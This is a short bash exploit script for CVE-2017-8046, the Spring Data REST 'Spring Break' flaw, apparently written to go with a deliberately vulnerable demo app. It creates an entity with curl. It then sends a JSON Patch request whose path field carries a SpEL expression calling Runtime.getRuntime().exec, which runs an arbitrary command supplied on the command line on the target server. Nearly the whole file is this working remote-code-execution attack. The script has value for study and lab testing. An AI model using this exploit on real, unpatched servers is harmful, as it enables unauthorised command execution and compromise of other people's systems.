#!/usr/bin/env bash
#
# Check exploit for the Spring Break vulnerability (CVE-2017-8046)
#
# Usage:
# sb_2017-8046.sh <app_url_and_port> <remote_command>
#
# <app_url_and_port>
#   The server ip and port to attack
#
# <remote_command>
#   The remote command to run
#
# Author: Antonio Francesco Sardella
# Link: https://github.com/m3ssap0/SpringBreakVulnerableApp
# License: MIT
#
# tag::code[]
APP_URL=$1
REMOTE_COMMAND=$2

curl -i -X POST -H "Content-Type: application/json" -d '{ "name" : "Test", "attribute" : "foo"}' http://$APP_URL/entity
curl --request PATCH -H "Content-Type: application/json-patch+json" -d '[{ "op" : "replace", "path" : "T(java.lang.Runtime).getRuntime().exec(\"'$REMOTE_COMMAND'\").x", "value" : "pwned" }]' "http://$APP_URL/entity/1/"
# end::code[]
